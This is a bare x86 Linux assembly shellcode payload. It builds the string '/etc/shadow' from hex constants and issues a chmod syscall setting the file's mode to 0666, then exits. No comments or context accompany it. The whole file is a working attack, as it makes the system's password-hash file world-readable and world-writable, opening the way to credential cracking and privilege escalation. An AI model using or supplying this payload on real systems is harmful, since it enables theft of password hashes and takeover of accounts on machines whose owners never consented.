 
 
 
  section .text
 
       global _start
 
  _start:
       xor edx, edx
 
       mov al,15
       push edx
       push byte 0x77
       push word 0x6f64
       push 0x6168732f
       push 0x6374652f
       mov ebx, esp
       push word 0x1b6
       pop ecx
       int 0x80
 
       mov al,1
       int 0x80
 
